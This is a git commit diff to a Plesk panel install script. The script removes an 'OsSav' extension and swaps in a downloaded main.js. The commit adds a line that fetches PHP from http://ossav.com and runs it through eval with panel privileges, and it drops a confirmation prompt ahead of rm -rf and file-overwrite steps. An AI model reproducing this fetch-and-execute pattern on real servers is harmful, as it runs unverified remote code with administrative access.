4df52d46b03a42a4e4a5d282d9fd08d40342b12b
trisout78 <81978700+trisout78@users.noreply.github.com>
2023-06-12 22:12:03 +0200

    Update install.sh

--- install.sh
+++ install.sh
@@ -2,11 +2,14 @@ echo "******************"
 echo "Script by Trisout"
 echo "******************"
 echo "Warning: This Script is made for 18.0.53 of plesk panel. It is possible that it does not work or that it destroys your plesk on higher versions."
-read -p "Press any key to resume ..."
-sleep 5
+sleep 20
+plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
+wait 5
 rm -rf /usr/local/psa/admin/htdocs/modules/OsSav
 plesk bin extension --uninstall OsSav
 rm /opt/psa/admin/cp/public/javascript/main.js
 cd /opt/psa/admin/cp/public/javascript
 wget https://raw.githubusercontent.com/trisout78/o-plesk/main/main.js
+echo "INFORMATION: after Error messages: <number>; Warnings: <number>; Errors resolved: <number> you can exit the script"
+wait 20
 plesk repair all -y
